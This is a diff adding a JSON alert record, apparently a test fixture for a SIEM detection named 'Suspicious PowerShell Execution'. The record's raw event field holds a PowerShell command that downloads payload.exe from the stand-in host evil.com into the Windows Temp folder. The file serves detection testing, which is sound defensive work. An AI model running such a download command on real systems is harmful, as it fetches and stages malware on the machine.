@@ -1,0 +1,12 @@
+{
+  "search_name": "Suspicious PowerShell Execution (No MITRE)",
+  "sid": "1659021230.3422",
+  "result": {
+    "severity": "high",
+    "_raw": "EventCode=4104 ScriptBlockText=\"Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe\"",
+    "host": "WIN-WKSTN-05",
+    "src_ip": "10.0.5.22",
+    "dest_ip": "198.51.100.14",
+    "_time": "2026-07-30T14:22:10Z"
+  }
+}
